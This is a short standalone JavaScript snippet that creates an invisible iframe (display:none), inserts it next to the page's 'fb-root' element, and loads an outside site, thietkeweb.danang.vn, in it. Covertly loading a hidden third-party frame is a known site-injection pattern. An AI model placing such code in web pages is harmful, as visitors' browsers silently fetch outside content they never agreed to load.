var ifrm = document.createElement('iframe');
ifrm.setAttribute('id', 'ifrm');
var el = document.getElementById('fb-root');
el.parentNode.insertBefore(ifrm, el);
ifrm.setAttribute('src', '//thietkeweb.danang.vn/?empty=insert-iframe-src');
ifrm.setAttribute('style', 'display:none');
